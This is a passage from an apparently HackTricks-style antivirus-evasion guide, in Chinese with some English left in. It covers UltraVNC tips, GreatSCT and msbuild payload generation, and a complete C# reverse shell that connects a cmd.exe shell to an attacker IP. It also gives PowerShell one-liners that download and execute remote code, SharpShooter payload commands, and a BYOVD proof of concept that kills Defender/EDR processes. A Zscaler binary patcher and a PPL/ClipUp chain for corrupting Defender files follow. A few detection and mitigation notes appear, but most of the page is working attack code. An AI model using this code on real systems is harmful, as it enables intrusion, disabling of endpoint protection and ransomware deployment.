- 不要在 `winvnc` 已经运行时再次启动它，否则会触发一个 [弹窗](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否正在运行
- 不要在没有 `UltraVNC.ini` 与其同目录的情况下启动 `winvnc`，否则会导致[配置窗口](https://i.imgur.com/rfMQWcf.png) 打开
- 不要运行 `winvnc -h` 来查看帮助，否则会触发一个 [弹窗](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在 **启动 lister** 使用 `msfconsole -r file.rc` 并 **执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的 Defender 会很快终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与其一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终结 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具在部署勒索软件前禁用终端防护。该工具携带其**自带的有漏洞但已签名的驱动**，并滥用它来下发特权的内核操作，即使是 Protected-Process-Light (PPL) 的 AV 服务也无法阻止这些操作。

关键要点
1. **Signed driver**：写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是来自 Antiy Labs “System In-Depth Analysis Toolkit” 的合法签名驱动 `AToolsKrnl64.sys`。因为该驱动带有有效的 Microsoft 签名，所以即使在启用 Driver-Signature-Enforcement (DSE) 的情况下也会被加载。
2. **Service installation**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为**内核服务**，第二行启动它，使得 `\\.\ServiceMouse` 可从用户态访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**：BYOVD 完全绕过用户态保护；在内核执行的代码可以打开*受保护*进程、终止它们或篡改内核对象，而不受 PPL/PP、ELAM 或其他加固特性的限制。

检测 / 缓解
• 启用 Microsoft 的易受攻击驱动屏蔽列表（`HVCI`, `Smart App Control`），以使 Windows 拒绝加载 `AToolsKrnl64.sys`。  
• 监控新的*内核*服务创建，并在驱动从可被所有用户写入的目录加载或不在允许列表中时发出警报。  
• 监视对自定义设备对象的用户态句柄随后出现可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 Client Connector 在本地应用 device-posture 规则，并依赖 Windows RPC 将结果与其他组件通信。两个薄弱的设计选择使得完全绕过成为可能：

1. 姿态评估完全在客户端执行（发送到服务器的是一个布尔值）。  
2. 内部 RPC 端点只验证连接的可执行文件是否由 Zscaler 签名（通过 `WinVerifyTrust`）。

通过在磁盘上修补四个已签名的二进制文件，这两种机制都可以被中和：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都视为合规 |
| `ZSAService.exe` | 间接调用 `WinVerifyTrust` | 被 NOP 处理 ⇒ 任何（即使未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的完整性检查 | 被短路 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启服务堆栈后：

* **所有** 态势检查显示 **绿色/合规**。
* 未签名或被修改的二进制文件可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 受损主机获得对由 Zscaler 策略定义的内部网络的不受限制访问。

该案例研究演示了如何通过少量字节补丁击败纯客户端的信任决策和简单的签名检查。

## 滥用 Protected Process Light (PPL) 利用 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制执行签名者/级别的层级关系，因此只有相同或更高级别的受保护进程才能相互篡改。进攻角度上，如果你能合法地启动一个启用了 PPL 的二进制并控制其参数，你就可以将良性功能（例如日志记录）转换为受限的、由 PPL 支持的写入原语，用于针对 AV/EDR 使用的受保护目录。

是什么让进程以 PPL 运行
- 目标 EXE（及任何加载的 DLL）必须使用支持 PPL 的 EKU 签名。
- 该进程必须通过 CreateProcess 创建，并使用以下标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制签名者匹配的兼容保护级别（例如，对反恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别将在创建时失败。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- 开源工具：CreateProcessAsPPL（选择保护级别并将参数转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 用法示例：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 原语: ClipUp.exe
- 签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自行启动进程，并接受一个参数，将日志文件写到调用者指定的路径。
- 当以 PPL 进程启动时，写文件操作在 PPL 保护下进行。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径来指向通常受保护的位置。

8.3 短路径辅助方法
- 列出短名：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

滥用链（概述）
1) 使用启动器（例如 CreateProcessAsPPL）以 `CREATE_PROTECTED_PROCESS` 启动具有 PPL 能力的 LOLBIN（ClipUp）。
2) 传入 ClipUp 的日志路径参数，以在受保护的 AV 目录（例如 Defender Platform）中强制创建文件。如有需要，使用 8.3 短名。
3) 如果目标二进制在 AV 运行时通常被打开/锁定（例如 MsMpEng.exe），通过安装一个会更早运行的自动启动服务来安排在 AV 启动之前于引导时执行写入。使用 Process Monitor（boot logging）验证引导顺序。
4) 重启后，具有 PPL 保护的写入会在 AV 锁定其二进制文件之前发生，破坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- 无法控制 ClipUp 写入的内容，除了放置位置；该 primitive 更适合用于破坏而非精确的内容注入。
- 需要本地 admin/SYSTEM 权限来安装/启动 service 并且需要一个重启窗口。
- 时机至关重要：目标不得被打开；在 boot-time 执行可避免文件锁定。

Detections
- Process creation of `ClipUp.exe` with unusual arguments, especially parented by non-standard launchers, around boot.
- New services configured to auto-start suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender startup failures.
- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications by processes with protected-process flags.
- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS` and anomalous PPL level usage by non-AV binaries.

Mitigations
- WDAC/Code Integrity: restrict which signed binaries may run as PPL and under which parents; block ClipUp invocation outside legitimate contexts.
- Service hygiene: restrict creation/modification of auto-start services and monitor start-order manipulation.
- Ensure Defender tamper protection and early-launch protections are enabled; investigate startup errors indicating binary corruption.
- Consider disabling 8.3 short-name generation on volumes hosting security tooling if compatible with your environment (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## 参考资料

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
